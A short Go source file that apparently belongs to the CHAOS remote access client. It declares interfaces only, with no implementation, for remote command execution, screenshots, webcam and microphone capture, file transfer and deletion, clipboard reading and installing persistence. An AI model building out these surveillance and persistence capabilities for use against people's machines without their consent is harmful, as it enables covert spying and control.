package services

import (
	"errors"
	"github.com/tiagorlampert/CHAOS/client/app/entities"
)

var (
	ErrUnsupportedPlatform = errors.New("unsupported platform")
	ErrDeadlineExceeded    = errors.New("command deadline exceeded")
)

type Services struct {
	Information
	Terminal
	Screenshot
	Webcam
	Microphone
	ScreenStream
	Download
	Upload
	Delete
	Explorer
	OS
	Url
}

type Information interface {
	LoadDeviceSpecs() (*entities.Device, error)
}

type Terminal interface {
	Run(command string) ([]byte, error)
}

type Screenshot interface {
	TakeScreenshot(quality int) ([]byte, error)
}

type Webcam interface {
	CaptureWebcam(quality int) ([]byte, error)
}

type Microphone interface {
	CaptureAudio(duration int, quality int) ([]byte, error)
}

type ScreenStream interface {
	StartScreenStream(duration int) ([]byte, error)
}

type Upload interface {
	UploadFile(path string) ([]byte, error)
}

type Delete interface {
	DeleteFile(filepath string) error
}

type Download interface {
	DownloadFile(filepath string) ([]byte, error)
}

type Explorer interface {
	ExploreDirectory(path string) (*entities.FileExplorer, error)
}

type OS interface {
	Restart() error
	Shutdown() error
	Lock() error
	SignOut() error
	InstallPersistence() error
	GetClipboard() (string, error)
}

type Url interface {
	OpenUrl(url string) error
}
